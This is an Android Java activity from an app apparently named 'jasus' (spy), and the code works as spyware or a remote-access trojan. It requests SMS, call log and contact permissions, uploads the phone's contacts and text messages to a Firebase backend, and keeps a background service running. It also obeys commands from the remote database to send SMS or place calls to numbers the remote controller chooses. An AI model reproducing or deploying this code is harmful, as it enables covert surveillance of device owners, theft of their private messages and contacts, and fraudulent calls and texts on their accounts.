package com.perry.jasus.Ui;

import static com.perry.jasus.Util.FirebaseConstant.UserDb;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.ActivityManager;
import android.app.AlertDialog;
import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.telephony.SmsManager;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.ValueEventListener;
import com.perry.jasus.ActionClasses.SmsUploader;
import com.perry.jasus.BackgroundServices.BackgroundService;
import com.perry.jasus.BackgroundServices.ReStarter;
import com.perry.jasus.Models.ActionSmsModel;
import com.perry.jasus.ActionClasses.ContactUploader;
import com.perry.jasus.Util.FirebaseConstant;
import com.perry.jasus.Util.LocalData;
import com.perry.jasus.databinding.ActivityMainBinding;

import java.util.HashMap;
import java.util.Map;

@RequiresApi(api = Build.VERSION_CODES.P)
public class MainActivity extends AppCompatActivity {


    static String deviceID;
    ActivityMainBinding binding;
    Intent mServiceIntent;
    private BackgroundService mBackgroundService;
    private static final int PERMISSIONS_REQUEST_MULTIPLE = 100;
    String[] permissions = {
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.FOREGROUND_SERVICE,
            Manifest.permission.READ_SMS
    };


    @SuppressLint("MissingInflatedId")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivityMainBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        deviceID = LocalData.getDeviceID();

        //Create Service
        mBackgroundService = new BackgroundService();
        mServiceIntent = new Intent(this, mBackgroundService.getClass());

        SmsUploader mSmsUploader = new SmsUploader(getApplicationContext());


        if (!isMyServiceRunning(mBackgroundService.getClass())) {
            startService(mServiceIntent);
            Map<String, Object> postValues = new HashMap<String, Object>();
            postValues.put("appStatus", "on");
            FirebaseConstant.UserDeviceDb.updateChildren(postValues);

        }

        runner();

        UserDb.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                String SmsAction = snapshot.child("SEND_SMS").child("action").getValue(String.class);
                String CallAction = snapshot.child("SEND_CALL").child("action").getValue(String.class);
                String mobile = snapshot.child("SEND_SMS").child("mobile").getValue(String.class);
                String callMobile = snapshot.child("SEND_CALL").child("mobile").getValue(String.class);
                String sms = snapshot.child("SEND_SMS").child("sms").getValue(String.class);
                String stopValue = snapshot.child("appStatus").getValue(String.class);

                if (stopValue != null) {
                    if (stopValue.equals("off")) {
                        stopService(mServiceIntent);
                        MainActivity.super.finishAffinity();
                    } else if (stopValue.equals("on")) {
                        startService(mServiceIntent);

                    }
                }

                if (SmsAction != null) {
                    if (SmsAction.equals("true")) {
                        try {
                            SmsManager smsManager = SmsManager.getDefault();
                            smsManager.sendTextMessage(mobile, null, sms, null, null);
                            Toast.makeText(getApplicationContext(), "Message Sent", Toast.LENGTH_LONG).show();
                            ActionSmsModel smsModel = new ActionSmsModel("false", "", "");

                            UserDb.child(deviceID).child("SEND_SMS").setValue(smsModel);


                        } catch (Exception ex) {
                            Toast.makeText(getApplicationContext(), ex.getMessage(), Toast.LENGTH_LONG).show();
                            ex.printStackTrace();
                        }
                    }

                }

                if (CallAction != null) {
                    if (CallAction.equals("true")) {
                        try {
                            Intent my_callIntent = new Intent(Intent.ACTION_CALL);
                            my_callIntent.putExtra("com.android.phone.extra.slot", 0);
                            my_callIntent.setData(Uri.parse("tel:" + callMobile));
                            startActivity(my_callIntent);

                            Map<String, Object> postValues = new HashMap<String, Object>();

                            postValues.put("action", "false");
                            postValues.put("mobile", "");
                            UserDb.child(deviceID).child("SEND_CALL").setValue(postValues);


                        } catch (ActivityNotFoundException e) {
                            Toast.makeText(getApplicationContext(), "Error in your phone call" + e.getMessage(), Toast.LENGTH_LONG).show();
                        }
                    }
                }

            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {

            }
        });



        if (!hasPermissions(permissions)) {
            ActivityCompat.requestPermissions(this, permissions, PERMISSIONS_REQUEST_MULTIPLE);
        }else{
            new Thread(() -> {
                ContactUploader.uploadContactsToFirebase(MainActivity.this);
                mSmsUploader.uploadSms();

            }).start();
        }


    }

    private boolean hasPermissions(String... permissions) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && permissions != null) {
            for (String permission : permissions) {
                if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                    return false;
                }
            }
        }
        return true;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == PERMISSIONS_REQUEST_MULTIPLE) {
            boolean allPermissionsGranted = true;
            for (int grantResult : grantResults) {
                if (grantResult != PackageManager.PERMISSION_GRANTED) {
                    allPermissionsGranted = false;
                    break;
                }
            }

            if (!allPermissionsGranted) {
                showDialog("Some permissions are required for the app to function properly. Please grant all permissions.");
            }
        }
    }

    private void showDialog(String message) {
        new AlertDialog.Builder(this)
                .setMessage(message)
                .setPositiveButton("OK", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        ActivityCompat.requestPermissions(MainActivity.this, permissions, PERMISSIONS_REQUEST_MULTIPLE);
                    }
                })
                .setNegativeButton("Cancel", null)
                .create()
                .show();
    }
    private void runner() {

        Handler handler = new Handler();
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {

                runner();
                SharedPreferences preferences2 = getSharedPreferences("APP", Context.MODE_PRIVATE);
                String ap = preferences2.getString("app", "");

                if (ap.equals("stop")) {
                    preferences2.edit().clear().commit();
                    MainActivity.super.finishAffinity();

                }


            }
        }, 1000);


    }

    @Override
    public void onBackPressed() {
        new AlertDialog.Builder(this)
                .setTitle("Exit")
                .setMessage("Do you want to exist")
                .setPositiveButton(":yes", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialogInterface, int i) {
                        MainActivity.super.finishAffinity();
                    }
                })
                .setNegativeButton("No", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialogInterface, int i) {
                        dialogInterface.dismiss();
                    }
                }).show();
    }

    //Current Service Checker
    private boolean isMyServiceRunning(Class<?> serviceClass) {
        ActivityManager manager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                Log.i("Service status", "Running");
                return true;
            }
        }
        Log.i("Service status", "Not running");

        return false;
    }


    private void perryService() {
        startService(mServiceIntent);
        Intent broadcastIntent = new Intent();
        broadcastIntent.setAction("restartService");
        broadcastIntent.setClass(this, ReStarter.class);
        this.sendBroadcast(broadcastIntent);
    }

}